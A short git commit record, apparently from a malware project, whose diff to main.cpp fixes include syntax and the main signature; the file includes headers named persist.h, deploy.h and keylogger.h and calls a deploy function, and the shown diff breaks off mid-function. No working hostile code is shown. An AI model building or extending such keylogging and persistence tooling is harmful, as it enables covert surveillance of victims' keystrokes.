627cc18493e985da4c8c684db343b107bcf86096
agdanski <agski@earthlink.net>
2018-10-04 10:30:20 -0400

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,8 +1,9 @@
-#include <persist.h>
-#include <deploy.h>
-#include <keylogger.h>
+#include "persist.h"
+#include "deploy.h"
+#include "keylogger.h"
+#include <stdio.h>
 
-int main(int argc, char argv[]){
+int main(int argc, char *argv[]){
 	bool hasRun = argc > 1;
 	deploy(hasRun);
 	if(!hasRun){
